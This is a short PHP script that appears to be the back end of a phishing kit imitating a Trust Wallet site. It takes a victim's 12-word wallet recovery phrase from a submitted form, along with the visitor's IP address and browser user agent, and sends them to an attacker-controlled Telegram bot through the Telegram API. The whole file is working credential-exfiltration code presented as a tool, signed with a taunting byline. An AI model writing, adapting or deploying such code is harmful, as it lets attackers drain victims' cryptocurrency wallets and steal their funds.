<?php

include "pedartel.php";

$QphraseQ = $_POST['phrase'];
$ip = $_SERVER["REMOTE_ADDR"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$TextPedar = " 
✅ TARGET 12KALAME TRUST WALLET SITE OMAD OMAD KHIKHI : 
╔═══════ 
║ 
╠ ☢️ 12KALAM(Phrase) : $QphraseQ 
║ 
╠ 🌐 ip : $ip 
║ 
╠ 💻BROWER {USER AGENT} : $browser_AGENT

💣 _CODED_BY #PULICE_FBI
"; 
$SENDBOT_RESULTS = file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($TextPedar));
